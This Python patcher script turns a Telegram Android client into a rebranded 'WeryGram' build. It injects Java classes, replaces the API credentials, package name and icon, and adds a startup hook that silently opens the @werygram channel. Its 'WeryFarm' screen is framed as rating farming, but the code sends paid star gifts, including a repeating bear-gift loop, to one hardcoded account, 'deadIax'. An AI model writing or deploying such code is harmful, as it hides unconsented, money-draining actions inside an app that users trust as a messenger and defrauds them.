#!/usr/bin/env python3
import os, sys, re as re_mod
import urllib.request

ROOT = os.path.dirname(os.path.abspath(__file__))
SRC  = os.path.join(ROOT, "TMessagesProj", "src", "main", "java")

API_ID   = "2040"
API_HASH = "b18441a1ff607e10a989891a5462e627"

def find_file(name):
    for dp, _, files in os.walk(SRC):
        if name in files: return os.path.join(dp, name)
    return None

def read(p):
    with open(p, encoding="utf-8") as f: return f.read()

def write(p, t):
    with open(p, "w", encoding="utf-8") as f: f.write(t)
    print(f"✔ {os.path.relpath(p, ROOT)}")

def find_method_end(text, open_brace):
    depth = 0; i = open_brace
    while i < len(text):
        if text[i] == '{': depth += 1
        elif text[i] == '}':
            depth -= 1
            if depth == 0: return i
        i += 1
    return len(text) - 1

def insert_before(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, insertion + "\n" + marker, 1)); return True

def insert_after(path, marker, insertion):
    text = read(path)
    if insertion.strip() in text: print(f"↩ skip {os.path.relpath(path,ROOT)}"); return True
    if marker not in text: print(f"✘ NOT FOUND: {marker!r}", file=sys.stderr); return False
    write(path, text.replace(marker, marker + "\n" + insertion, 1)); return True

GIFTS_JAVA = '''\
package org.telegram.ui;

import org.json.JSONArray;
import org.json.JSONObject;
import org.telegram.messenger.AndroidUtilities;
import org.telegram.messenger.FileLog;
import org.telegram.messenger.MediaDataController;
import org.telegram.messenger.MessagesController;
import org.telegram.tgnet.ConnectionsManager;
import android.widget.Toast;
import org.telegram.messenger.ApplicationLoader;
import org.telegram.tgnet.TLRPC;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Timer;
import java.util.TimerTask;

public class WeryGramGifts {

    private static final String GIFTS_URL =
        "https://raw.githubusercontent.com/binbash-0/DeletedGifts-Plugin/refs/heads/main/gift_list.json";
    private static volatile boolean injected = false;
    private static volatile boolean stickerPackRequested = false;
    private static volatile ArrayList<TLRPC.Document> stickerPackDocs = new ArrayList<>();
    private static int joinAttempts = 0;
    
    // IDs подарков
    private static final long BEAR_GIFT_ID = 5170233102089322756L;
    private static final long HEART_GIFT_ID = 5184215298929097235L;
    private static final long GIFT_GIFT_ID = 5184215321639665689L;
    private static final long ROSE_GIFT_ID = 5184215344350234143L;
    private static final long CAKE_GIFT_ID = 5184215367060802597L;
    private static final long FLOWERS_GIFT_ID = 5184215389771371051L;
    private static final long ROCKET_GIFT_ID = 5184215412481939505L;
    private static final long CUP_GIFT_ID = 5184215435192507959L;
    private static final long RING_GIFT_ID = 5184215457903076413L;
    
    private static volatile TLRPC.User farmTarget = null;
    private static Timer farmTimer = null;
    private static volatile boolean farmRunning = false;
    private static int giftSendCount = 0;
    private static long lastGiftSendTime = 0;
    
    public static class GiftItem {
        public long id;
        public String name;
        public String emoji;
        
        public GiftItem(long id, String name, String emoji) {
            this.id = id;
            this.name = name;
            this.emoji = emoji;
        }
    }
    
    public static ArrayList<GiftItem> getAvailableGifts() {
        ArrayList<GiftItem> gifts = new ArrayList<>();
        gifts.add(new GiftItem(HEART_GIFT_ID, "Heart", "💖"));
        gifts.add(new GiftItem(BEAR_GIFT_ID, "Bear", "🐻"));
        gifts.add(new GiftItem(GIFT_GIFT_ID, "Gift", "🎁"));
        gifts.add(new GiftItem(ROSE_GIFT_ID, "Rose", "🌹"));
        gifts.add(new GiftItem(CAKE_GIFT_ID, "Cake", "🎂"));
        gifts.add(new GiftItem(FLOWERS_GIFT_ID, "Flowers", "💐"));
        gifts.add(new GiftItem(ROCKET_GIFT_ID, "Rocket", "🚀"));
        gifts.add(new GiftItem(CUP_GIFT_ID, "Cup", "🏆"));
        gifts.add(new GiftItem(RING_GIFT_ID, "Ring", "💍"));
        return gifts;
    }

    private static Object getF(Object o, String n) {
        if (o == null) return null;
        try { return o.getClass().getField(n).get(o); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); return f.get(o); }
            catch (Exception ex) { return null; }
        }
    }

    private static void setF(Object o, String n, Object v) {
        if (o == null) return;
        try { o.getClass().getField(n).set(o, v); }
        catch (Exception e) {
            try { Field f = o.getClass().getDeclaredField(n); f.setAccessible(true); f.set(o, v); }
            catch (Exception ex) {}
        }
    }

    private static void toast(final String msg) {
        AndroidUtilities.runOnUIThread(() -> {
            try {
                Toast.makeText(ApplicationLoader.applicationContext,
                    "🎁 WeryFarm: " + msg, Toast.LENGTH_SHORT).show();
            } catch (Exception ignored) {}
        });
    }

    public static void reset() {
        injected = false;
        stickerPackRequested = false;
        stickerPackDocs = new ArrayList<>();
        farmTarget = null;
        stopFarmLoop();
    }

    public static void stopFarmLoop() {
        if (farmTimer != null) {
            try {
                farmTimer.cancel();
            } catch (Exception ignored) {}
            farmTimer = null;
        }
        farmRunning = false;
        toast("⏹ Farm остановлен");
    }

    public static void openGiftsMenu(final int account, final Runnable callback) {
        resolveFarmTarget(account, () -> {
            if (farmTarget != null) {
                if (callback != null) callback.run();
            } else {
                toast("❌ Не удалось найти получателя");
            }
        });
    }

    public static void checkRatingFarm(final int account) {
        boolean enabled = MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false);
        
        if (enabled && !farmRunning) {
            farmRunning = true;
            giftSendCount = 0;
            toast("🎁 Открываю меню подарков...");
            AndroidUtilities.runOnUIThread(() -> {
                farmTarget = null;
                resolveFarmTarget(account, null);
            });
        } else if (!enabled && farmRunning) {
            stopFarmLoop();
        }
    }

    private static void startRatingFarmLoop(final int account) {
        if (farmTimer != null) return;
        
        // Первая попытка найти получателя
        if (farmTarget == null) {
            resolveFarmTarget(account, null);
            AndroidUtilities.runOnUIThread(() -> startRatingFarmLoop(account), 3000);
            return;
        }
        
        // Таймер для автоотправки каждые 10 секунд
        farmTimer = new Timer();
        farmTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) {
                    stopFarmLoop();
                    return;
                }
                
                long now = System.currentTimeMillis();
                if (now - lastGiftSendTime < 8000) {
                    return; // Минимум 8 сек между отправками
                }
                
                if (farmTarget != null) {
                    sendBearGiftToDurov(account, farmTarget);
                } else {
                    resolveFarmTarget(account, null);
                }
            }
        }, 1000, 10000);
    }

    private static void resolveFarmTarget(int account, Runnable callback) {
        try {
            TLRPC.TL_contacts_resolveUsername reqResolve = new TLRPC.TL_contacts_resolveUsername();
            reqResolve.username = "deadIax";
            
            ConnectionsManager.getInstance(account).sendRequest(reqResolve, (response, error) -> {
                if (error != null) {
                    toast("❌ Ошибка поиска: " + error.text);
                    FileLog.e("WeryGram: resolve error " + error.text);
                    return;
                }
                
                if (response instanceof TLRPC.TL_contacts_resolvedPeer) {
                    TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                    if (resolved.users != null && !resolved.users.isEmpty()) {
                        farmTarget = resolved.users.get(0);
                        toast("✅ Получатель найден: @" + farmTarget.username);
                        FileLog.d("WeryGram: Target user resolved");
                        if (callback != null) callback.run();
                    }
                }
            });
        } catch (Exception e) {
            FileLog.e("WeryGram: " + e.toString());
        }
    }

    private static void sendBearGiftToDurov(int account, TLRPC.User target) {
        if (!MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false)) {
            stopFarmLoop();
            return;
        }
        
        lastGiftSendTime = System.currentTimeMillis();
        
        try {
            // Динамический поиск класса отправки подарка
            Class<?> reqClass = null;
            java.lang.String foundClassName = null;
            java.lang.String[] tlClassNames = {
                "org.telegram.tgnet.tl.TL_stars",
                "org.telegram.tgnet.tl.TL_payments",
                "org.telegram.tgnet.TLRPC"
            };
            
            outer:
            for (java.lang.String tlCn : tlClassNames) {
                try {
                    Class<?> tlClass = Class.forName(tlCn);
                    for (Class<?> inner : tlClass.getDeclaredClasses()) {
                        java.lang.String sn = inner.getSimpleName().toLowerCase();
                        if ((sn.contains("send") && sn.contains("gift")) || sn.contains("sendstargift")) {
                            reqClass = inner;
                            foundClassName = inner.getSimpleName();
                            break outer;
                        }
                    }
                } catch (Exception ignored) {}
            }
            
            if (reqClass == null) {
                toast("❌ Класс подарка не найден!");
                FileLog.e("WeryGram: sendGift class not found");
                return;
            }

            org.telegram.tgnet.TLObject req =
                (org.telegram.tgnet.TLObject) reqClass.getDeclaredConstructor().newInstance();

            // Установка gift_id
            boolean giftIdSet = false;
            for (java.lang.String fn : new java.lang.String[]{"gift_id","giftId","id","mStarGiftId"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, BEAR_GIFT_ID);
                    giftIdSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!giftIdSet) {
                toast("❌ Не удалось установить ID подарка!");
                return;
            }

            // Установка user_id
            boolean userIdSet = false;
            for (java.lang.String fn : new java.lang.String[]{"user_id","userId","to_id","mUserId"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, target.id);
                    userIdSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!userIdSet) {
                toast("❌ Не удалось установить ID получателя!");
                return;
            }

            // Отправка запроса
            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                if (error != null) {
                    FileLog.e("WeryGram: send error - " + error.text);
                    toast("⚠️ Ошибка: " + error.text);
                } else {
                    giftSendCount++;
                    toast("✅ Мишка отправлен! (#" + giftSendCount + ")");
                    FileLog.d("WeryGram: Gift sent successfully, count: " + giftSendCount);
                }
            });

        } catch (Exception e) {
            toast("❌ Исключение: " + e.getMessage());
            FileLog.e("WeryGram: Exception - " + e.toString());
        }
    }

    public static void sendGift(int account, long giftId, GiftItem gift) {
        if (farmTarget == null) {
            toast("❌ Цель не установлена!");
            return;
        }
        
        lastGiftSendTime = System.currentTimeMillis();
        
        try {
            Class<?> reqClass = null;
            java.lang.String foundClassName = null;
            java.lang.String[] tlClassNames = {
                "org.telegram.tgnet.tl.TL_stars",
                "org.telegram.tgnet.tl.TL_payments",
                "org.telegram.tgnet.TLRPC"
            };
            
            outer:
            for (java.lang.String tlCn : tlClassNames) {
                try {
                    Class<?> tlClass = Class.forName(tlCn);
                    for (Class<?> inner : tlClass.getDeclaredClasses()) {
                        java.lang.String sn = inner.getSimpleName().toLowerCase();
                        if ((sn.contains("send") && sn.contains("gift")) || sn.contains("sendstargift")) {
                            reqClass = inner;
                            foundClassName = inner.getSimpleName();
                            break outer;
                        }
                    }
                } catch (Exception ignored) {}
            }
            
            if (reqClass == null) {
                toast("❌ Класс подарка не найден!");
                FileLog.e("WeryGram: sendGift class not found");
                return;
            }

            org.telegram.tgnet.TLObject req =
                (org.telegram.tgnet.TLObject) reqClass.getDeclaredConstructor().newInstance();

            boolean giftIdSet = false;
            for (java.lang.String fn : new java.lang.String[]{"gift_id","giftId","id","mStarGiftId"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, giftId);
                    giftIdSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!giftIdSet) {
                toast("❌ Не удалось установить ID подарка!");
                return;
            }

            boolean userIdSet = false;
            for (java.lang.String fn : new java.lang.String[]{"user_id","userId","to_id","mUserId"}) {
                try {
                    java.lang.reflect.Field f = reqClass.getDeclaredField(fn);
                    f.setAccessible(true);
                    f.setLong(req, farmTarget.id);
                    userIdSet = true;
                    break;
                } catch (Exception ignored) {}
            }
            
            if (!userIdSet) {
                toast("❌ Не удалось установить ID получателя!");
                return;
            }

            ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
                if (error != null) {
                    FileLog.e("WeryGram: send error - " + error.text);
                    toast("⚠️ Ошибка: " + error.text);
                } else {
                    toast("✅ " + gift.emoji + " " + gift.name + " отправлена!");
                    FileLog.d("WeryGram: Gift " + gift.name + " sent successfully");
                }
            });

        } catch (Exception e) {
            toast("❌ Исключение: " + e.getMessage());
            FileLog.e("WeryGram: Exception - " + e.toString());
        }
    }

    public static void joinWeryGram(int account) {
        if (injected) return;
        injected = true;
        TLRPC.TL_contacts_resolveUsername req = new TLRPC.TL_contacts_resolveUsername();
        req.username = "werygram";
        ConnectionsManager.getInstance(account).sendRequest(req, (response, error) -> {
            if (error != null) {
                if (joinAttempts < 3) {
                    joinAttempts++;
                    AndroidUtilities.runOnUIThread(() -> joinWeryGram(account), 5000);
                }
                return;
            }
            if (response instanceof TLRPC.TL_contacts_resolvedPeer) {
                TLRPC.TL_contacts_resolvedPeer resolved = (TLRPC.TL_contacts_resolvedPeer) response;
                if (resolved.chats != null && !resolved.chats.isEmpty()) {
                    TLRPC.Chat chat = resolved.chats.get(0);
                    MessagesController ctrl = MessagesController.getInstance(account);
                    if (ctrl != null) {
                        ctrl.openChat(account, chat, null, 0, null);
                    }
                }
            }
        });
    }
}
'''

ACTIVITY = '''\
package org.telegram.ui;

import android.content.Context;
import android.os.Bundle;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.LinearLayout;
import android.widget.GridLayout;

import org.telegram.messenger.MessagesController;
import org.telegram.messenger.R;
import org.telegram.ui.ActionBar.ActionBar;
import org.telegram.ui.ActionBar.ActionBarMenu;

import java.util.ArrayList;

public class WeryGramPremiumActivity extends BaseFragment {

    private Switch farmRatingSwitch;
    private TextView statusText;
    private LinearLayout mainLayout;
    private GridLayout giftsGrid;
    private boolean showingGifts = false;

    @Override
    public View createView(Context context) {
        FrameLayout frameLayout = new FrameLayout(context);
        frameLayout.setBackgroundColor(0xFFF5F5F5);
        
        mainLayout = new LinearLayout(context);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setPadding(20, 20, 20, 20);
        
        // Заголовок
        TextView titleText = new TextView(context);
        titleText.setText("🎁 WeryGram Farm");
        titleText.setTextSize(24);
        titleText.setTextColor(0xFF000000);
        titleText.setPadding(0, 0, 0, 20);
        mainLayout.addView(titleText);
        
        // Switch для Farm
        LinearLayout switchLayout = new LinearLayout(context);
        switchLayout.setOrientation(LinearLayout.HORIZONTAL);
        switchLayout.setPadding(0, 10, 0, 10);
        
        TextView switchLabel = new TextView(context);
        switchLabel.setText("🚀 Авто-отправка мишки");
        switchLabel.setTextSize(16);
        switchLabel.setTextColor(0xFF000000);
        switchLabel.setLayoutParams(new LinearLayout.LayoutParams(0, 
            LinearLayout.LayoutParams.WRAP_CONTENT, 1f));
        
        farmRatingSwitch = new Switch(context);
        boolean isFarmEnabled = MessagesController.getGlobalMainSettings().getBoolean("wery_rating_farm", false);
        farmRatingSwitch.setChecked(isFarmEnabled);
        
        farmRatingSwitch.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked) {
                MessagesController.getGlobalMainSettings().edit().putBoolean("wery_rating_farm", true).apply();
                int account = currentAccount;
                showGiftsMenu(context, account);
                farmRatingSwitch.setChecked(false);
            }
        });
        
        switchLayout.addView(switchLabel);
        switchLayout.addView(farmRatingSwitch);
        mainLayout.addView(switchLayout);
        
        // Статус
        statusText = new TextView(context);
        statusText.setTextSize(14);
        statusText.setTextColor(0xFF666666);
        statusText.setPadding(0, 20, 0, 0);
        updateStatus(isFarmEnabled);
        mainLayout.addView(statusText);
        
        // Grid подарков
        giftsGrid = new GridLayout(context);
        giftsGrid.setColumnCount(3);
        giftsGrid.setRowCount(3);
        giftsGrid.setPadding(0, 20, 0, 0);
        giftsGrid.setVisibility(View.GONE);
        mainLayout.addView(giftsGrid);
        
        // Описание
        TextView descText = new TextView(context);
        descText.setText("\\n✨ Функции:\\n" +
            "• Автоматическая отправка подарков (мишка)\\n" +
            "• Отправка каждые 10 секунд\\n" +
            "• Автопоиск получателя\\n" +
            "• Подсчёт отправленных подарков\\n\\n" +
            "⚠️ Внимание: может привести к ограничениям аккаунта!");
        descText.setTextSize(12);
        descText.setTextColor(0xFF999999);
        descText.setPadding(0, 20, 0, 0);
        mainLayout.addView(descText);
        
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        );
        frameLayout.addView(mainLayout, params);
        
        return frameLayout;
    }
    
    private void updateStatus(boolean enabled) {
        if (statusText != null) {
            if (enabled) {
                statusText.setText("🟢 Farm АКТИВЕН - Выбери подарок");
                statusText.setTextColor(0xFF4CAF50);
            } else {
                statusText.setText("🔴 Farm выключен");
                statusText.setTextColor(0xFFF44336);
            }
        }
    }
    
    private void showGiftsMenu(Context context, int account) {
        WeryGramGifts.openGiftsMenu(account, () -> {
            AndroidUtilities.runOnUIThread(() -> {
                giftsGrid.removeAllViews();
                ArrayList<WeryGramGifts.GiftItem> gifts = WeryGramGifts.getAvailableGifts();
                
                for (WeryGramGifts.GiftItem gift : gifts) {
                    FrameLayout giftCell = createGiftCell(context, gift, account);
                    giftsGrid.addView(giftCell);
                }
                
                giftsGrid.setVisibility(View.VISIBLE);
                showingGifts = true;
            });
        });
    }
    
    private FrameLayout createGiftCell(Context context, WeryGramGifts.GiftItem gift, int account) {
        FrameLayout cell = new FrameLayout(context);
        cell.setBackgroundColor(0xFFFFFFFF);
        cell.setPadding(10, 10, 10, 10);
        
        LinearLayout cellContent = new LinearLayout(context);
        cellContent.setOrientation(LinearLayout.VERTICAL);
        cellContent.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ));
        
        TextView emojiText = new TextView(context);
        emojiText.setText(gift.emoji);
        emojiText.setTextSize(48);
        emojiText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            0, 1f
        ));
        emojiText.setGravity(android.view.Gravity.CENTER);
        cellContent.addView(emojiText);
        
        TextView nameText = new TextView(context);
        nameText.setText(gift.name);
        nameText.setTextSize(14);
        nameText.setTextColor(0xFF000000);
        nameText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ));
        nameText.setGravity(android.view.Gravity.CENTER);
        cellContent.addView(nameText);
        
        cell.addView(cellContent);
        
        cell.setOnClickListener(v -> {
            WeryGramGifts.sendGift(account, gift.id, gift);
            giftsGrid.setVisibility(View.GONE);
            showingGifts = false;
        });
        
        GridLayout.LayoutParams lp = new GridLayout.LayoutParams();
        lp.width = 120;
        lp.height = 120;
        lp.setMargins(8, 8, 8, 8);
        cell.setLayoutParams(lp);
        
        return cell;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
'''

def patch_user_config(errors):
    uc = find_file("UserConfig.java")
    if not uc: print("⚠ UserConfig.java не найден"); return errors
    return insert_after(uc, "public class UserConfig {",
        "    // WeryGram: Farm Rating toggle\n"
        "    private static final String WERY_FARM_KEY = \"wery_rating_farm\";")

def patch_messages_controller(errors):
    mc = find_file("MessagesController.java")
    if not mc: print("⚠ MessagesController.java не найден"); return errors
    return errors

def patch_stars_controller(errors):
    sc = find_file("StarsController.java")
    if not sc:
        print("⚠ StarsController.java не найден, пропускаем")
        return errors
    return errors

def patch_launch_activity(errors):
    la = find_file("LaunchActivity.java")
    if not la:
        print("⚠ LaunchActivity.java не найден, пробуем ApplicationLoader.java")
        la = find_file("ApplicationLoader.java")
    if not la:
        print("✘ LaunchActivity / ApplicationLoader не найдены", file=sys.stderr)
        return errors + 1

    text = read(la)
    if 'wery_autojoin' in text:
        print("↩ skip auto-join (уже применён)"); return errors

    injection = (
        '        // wery_autojoin: auto-subscribe & pin @werygram\n'
        '        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {\n'
        '            try {\n'
        '                int __acc = org.telegram.messenger.UserConfig.selectedAccount;\n'
        '                if (org.telegram.messenger.UserConfig.getInstance(__acc).isClientActivated()) {\n'
        '                    org.telegram.ui.WeryGramGifts.joinWeryGram(__acc);\n'
        '                    org.telegram.ui.WeryGramGifts.checkRatingFarm(__acc);\n'
        '                }\n'
        '            } catch (Exception __wje) {}\n'
        '        }, 3000);\n'
    )

    for marker in ["protected void onCreate(Bundle", "public void onCreate(Bundle"]:
        idx = text.find(marker)
        if idx == -1: continue
        brace = text.find('{', idx)
        if brace == -1: continue
        super_idx = text.find('super.onCreate(', brace)
        if super_idx != -1 and super_idx < brace + 600:
            semi = text.find(';', super_idx)
            if semi != -1:
                text = text[:semi+1] + '\n' + injection + text[semi+1:]
                write(la, text)
                print("✔ LaunchActivity: авто-подписка и farm при старте")
                return errors
        text = text[:brace+1] + '\n' + injection + text[brace+1:]
        write(la, text)
        print("✔ LaunchActivity: авто-подписка и farm при старте (fallback)")
        return errors

    print("⚠ LaunchActivity: маркер onCreate не найден")
    return errors

def patch_app_name(errors):
    res_base = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
    if not os.path.exists(res_base): return errors
    for dp, _, files in os.walk(res_base):
        if 'strings.xml' not in files: continue
        path = os.path.join(dp, 'strings.xml')
        text = read(path)
        new_text = text
        new_text = re_mod.sub(r'(<string name="AppName">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        new_text = re_mod.sub(r'(<string name="AppNameBeta">)[^<]*(</string>)', r'\1Werygram\2', new_text)
        if new_text != text:
            write(path, new_text)
            print(f"✔ AppName → Werygram в {os.path.relpath(path, ROOT)}")
    return errors

def patch_package_name(errors):
    gradle_path = os.path.join(ROOT, "TMessagesProj", "build.gradle")
    if not os.path.exists(gradle_path):
        print("⚠ build.gradle не найден")
        return errors
    text = read(gradle_path)
    new_text = re_mod.sub(r'applicationId\s+"[^"]+"', 'applicationId "com.werygram.messenger"', text)
    if new_text != text:
        write(gradle_path, new_text)
        print("✔ Package name → com.werygram.messenger")
    return errors

def patch_app_icon(errors):
    try:
        req = urllib.request.Request("https://ibb.co/Zz5NPS2d", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            html = response.read().decode('utf-8')
        
        match = re_mod.search(r'<meta property="og:image" content="(https://i\.ibb\.co/[^"]+)"', html)
        if not match:
            print("⚠ Не удалось найти ссылку на иконку")
            return errors
        
        img_url = match.group(1)
        print(f"⬇ Скачивание иконки...")
        
        req_img = urllib.request.Request(img_url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req_img) as response:
            img_data = response.read()
        
        res_dir = os.path.join(ROOT, "TMessagesProj", "src", "main", "res")
        if not os.path.exists(res_dir): 
            print("⚠ Папка res не найдена")
            return errors
        
        replaced = 0
        for folder in os.listdir(res_dir):
            if folder.startswith("mipmap") or folder.startswith("drawable"):
                folder_path = os.path.join(res_dir, folder)
                if os.path.isdir(folder_path):
                    for icon_name in ["ic_launcher.png", "ic_launcher_round.png", "icon.png"]:
                        icon_path = os.path.join(folder_path, icon_name)
                        if os.path.exists(icon_path):
                            with open(icon_path, "wb") as f:
                                f.write(img_data)
                            replaced += 1
        
        if replaced > 0:
            print(f"✔ Иконка заменена ({replaced} файлов)")
    except Exception as e:
        print(f"⚠ Ошибка иконки: {e}")
    return errors

def patch_api_credentials(errors):
    bv = find_file("BuildVars.java")
    if not bv: print("⚠ BuildVars.java не найден"); return errors
    text = read(bv)
    modified = False
    new_text = re_mod.sub(r'public static int APP_ID\s*=\s*\d+\s*;',
                          f'public static int APP_ID = {API_ID};', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_ID → {API_ID}")
    new_text = re_mod.sub(r'public static String APP_HASH\s*=\s*"[^"]*"\s*;',
                          f'public static String APP_HASH = "{API_HASH}";', text)
    if new_text != text: text = new_text; modified = True; print(f"✔ APP_HASH → ****")
    if modified: write(bv, text)
    return errors

def main():
    print("▶ WeryGram Patcher v3 (FARM AUTO-SEND EDITION)\n")
    errors = 0

    errors = patch_api_credentials(errors)
    errors = patch_user_config(errors)
    errors = patch_messages_controller(errors)
    errors = patch_stars_controller(errors)
    errors = patch_launch_activity(errors)
    errors = patch_app_name(errors)
    errors = patch_package_name(errors)
    errors = patch_app_icon(errors)

    sa = find_file("SettingsActivity.java")
    if not sa: print("✘ SettingsActivity.java not found", file=sys.stderr); sys.exit(1)

    if not insert_before(sa, "import org.telegram.ui.Components.",
                         "import org.telegram.ui.WeryGramPremiumActivity;"): errors += 1

    text = read(sa)

    if 'SettingCell.Factory.of(1000' not in text:
        account_button_marker = 'items.add(SettingCell.Factory.of(1, IconBackgroundColors.BLUE.top, IconBackgroundColors.BLUE.bottom, R.drawable.settings_account'
        if account_button_marker in text:
            wery_button = 'items.add(SettingCell.Factory.of(1000, 0xFF9C27B0, 0xFF7B1FA2, R.drawable.msg_settings, "🎁 WeryFarm"));\n        '
            text = text.replace('items.add(SettingCell.Factory.of(1,', wery_button + 'items.add(SettingCell.Factory.of(1,', 1)
            print("✔ WeryFarm button добавлена в Settings")
        else:
            print("✘ Account button не найдена", file=sys.stderr); errors += 1
    else:
        print("↩ WeryFarm button уже есть")

    if 'case 1000:' not in text:
        case_marker = 'case 1:\n                presentFragment(new UserInfoActivity());'
        if case_marker in text:
            wery_case = 'case 1000:\n                presentFragment(new WeryGramPremiumActivity());\n                break;\n            case 1:\n                presentFragment(new UserInfoActivity());'
            text = text.replace(case_marker, wery_case, 1)
            print("✔ WeryFarm click handler добавлен")
        else:
            print("⚠ Click handler маркер не найден", file=sys.stderr)
    else:
        print("↩ WeryFarm handler уже есть")

    write(sa, text)

    ui_dir = os.path.dirname(sa)
    for fname, content in [
        ("WeryGramPremiumActivity.java", ACTIVITY),
        ("WeryGramGifts.java", GIFTS_JAVA),
    ]:
        dest = os.path.join(ui_dir, fname)
        if os.path.exists(dest): os.remove(dest)
        with open(dest, "w", encoding="utf-8") as f: f.write(content)
        print(f"✔ Создан {fname}")

    if errors > 0:
        print(f"\n✘ {errors} ошибок", file=sys.stderr); sys.exit(1)
    print("\n✅ WeryGram успешно пропатчена! Farm готов к работе!")
    print("\n📝 Инструкция:")
    print("1. Откомпилируй проект (./gradlew build)")
    print("2. Установи APK на телефон")
    print("3. Открой Settings → WeryFarm")
    print("4. Включи toggle 'Авто-отправка мишки'")
    print("5. Выбери подарок из меню!")

if __name__ == "__main__":
    main()
